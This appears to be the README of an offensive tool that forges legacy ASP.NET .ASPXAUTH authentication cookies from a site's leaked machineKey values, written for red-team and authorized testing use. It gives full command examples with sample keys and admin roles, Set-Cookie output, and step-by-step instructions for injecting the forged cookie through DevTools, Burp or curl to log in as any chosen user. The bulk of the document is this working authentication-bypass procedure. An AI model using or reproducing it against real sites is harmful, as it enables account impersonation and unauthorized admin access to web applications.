# ASPXAuth Forge

**Generate legacy ASP.NET `.ASPXAUTH` authentication cookies**  
for authorized security testing, red-team labs, or research environments.

> **Legal & Ethical Notice**  
> This tool must **only** be used against systems you are explicitly authorized to test.  
> The author and repository owner assume no responsibility for misuse.

---

## What It Does

Classic ASP.NET applications (Framework 2.x–4.x) often rely on **Forms Authentication**
and issue a cookie named `.ASPXAUTH`.  
This cookie contains an encrypted and HMAC-signed “ticket” describing the user, roles,
expiration, and other metadata.

`aspxauth_forge.py` lets you **generate compatible cookies** when you already know
(or have recovered) the app’s `validationKey` and `decryptionKey` from its `web.config`.

It’s primarily intended for:
- Red-team operators reproducing legacy auth behavior in lab environments  
- Developers performing compatibility testing or forensic reconstruction  
- Pentesters validating weak machineKey configurations (authorized scope)

---

## Features

| Capability | Description |
|-------------|--------------|
| AES-CBC (zero IV) + HMAC-SHA256 | Matches legacy FormsAuth crypto |
| Custom username / roles / groups | Controlled via `--username`, `--roles`, or `--user-data` |
| Configurable ticket lifetime | `--lifetime-hours` sets the internal expiration checked by the server |
| Optional `Set-Cookie` output | Generates a ready-to-paste `Set-Cookie` header |
| Dry-run mode | Validates key and data handling without emitting secrets |
| Cross-platform | Pure Python 3.9+, no .NET dependency |

---

## Installation

```bash
python3 -m pip install pycryptodome
```

Clone or download this repo, then run the script directly:

```bash
chmod +x aspxauth_forge.py
```

---

## Usage

### Required arguments
- `--username` — user name embedded in the ticket  
- `--decryption-key` — the app’s `decryptionKey` (hex)  
- `--validation-key` — the app’s `validationKey` (hex)  

### Common optional arguments

| Option | Purpose |
|-------|---------|
| `--roles "Admin,Users"` | Add comma-separated roles (translated into `userData`) |
| `--user-data "role=admin\|dept=it"` | Provide raw `userData` string (overrides `--roles`) |
| `--lifetime-hours 4` | Ticket validity period (server-side) |
| `--persistent` | Marks ticket as persistent (browser hint only) |
| `--out base64` (or `hex`, `both`) | Output format (default `base64`) |
| `--set-cookie` | Print a `Set-Cookie` header (ready for browser/proxy injection) |
| `--cookie-name .ASPXAUTH` | Change cookie name |
| `--cookie-domain example.com` | Add a Domain attribute |
| `--cookie-expires-hours 12` | Make the browser cookie persistent (client-side only) |
| `--dry-run` | Validate and exit without output |

---

### Example 1 – Basic Forge

```bash
python aspxauth_forge.py \
  --username "web_admin" \
  --decryption-key B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581 \
  --validation-key EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80 \
  --roles "Web Users" \
  --lifetime-hours 2 \
  --set-cookie
```

### Example 2 – Custom `userData`

```bash
python aspxauth_forge.py \
  --username alice \
  --user-data "role=admin|domain=acme" \
  --decryption-key <HEX_DEC_KEY> \
  --validation-key <HEX_VAL_KEY> \
  --out both
```

---

## Understanding Lifetime & Persistence

| Setting | Enforced by | Effect |
|----------|--------------|--------|
| `--lifetime-hours` | **Server** | Embedded ticket expiration (checked during validation). If expired, the server rejects the cookie even if the browser keeps it. |
| `--persistent` | **Client** | Only affects whether the browser stores the cookie beyond session close. Doesn’t impact server authorization. |
| `--cookie-expires-hours` | **Client** | Adds an `Expires`/`Max-Age` attribute in `Set-Cookie`. Controls how long the browser keeps the cookie, not how long the server honors it. |

---

## Using the Generated Cookie

### Browser (DevTools)

1. Open the target site (same domain/path as cookie scope).  
2. Open **Application → Storage → Cookies**.  
3. Add a cookie:
   - **Name:** `.ASPXAUTH`
   - **Value:** Hex output from the tool  
   - **Path:** `/`
   - **Secure:** check if HTTPS  
   - **HttpOnly:** usually checked  
   - **SameSite:** `Lax` or `None`
4. Refresh — you’ll be logged in as the forged user while the ticket is valid.

### Proxy / Burp Suite

```
Cookie: .ASPXAUTH=<Base64Value>
```

### cURL

```bash
curl -k -H "Cookie: .ASPXAUTH=<Base64Value>" https://target.local/App/Default.aspx
```

---

## Example Reference

```xml
<machineKey
  validationKey="EBF9076B4E30..."
  decryptionKey="B26C371EA0A7..."
  validation="HMACSHA256"
  decryption="AES"
/>
```

---

## License

MIT © Sc4n-X
